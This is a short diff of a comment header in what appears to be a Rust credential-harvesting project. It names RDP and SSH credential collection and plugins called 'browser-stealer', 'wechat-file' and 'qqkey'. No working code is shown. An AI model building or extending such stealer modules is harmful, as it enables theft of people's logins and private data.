@@ -1,5 +1,5 @@
-//! Credentials cloud module — RDP, SSH (WeChat/browser live in plugins:
-//! com.libra.wechat-file / com.libra.browser-stealer).
+//! Credentials cloud module — RDP, SSH (WeChat/QQ live in plugins:
+//! com.libra.wechat-file / com.libra.qqkey).
 #![allow(non_snake_case)]
 #![allow(clippy::upper_case_acronyms)]
 
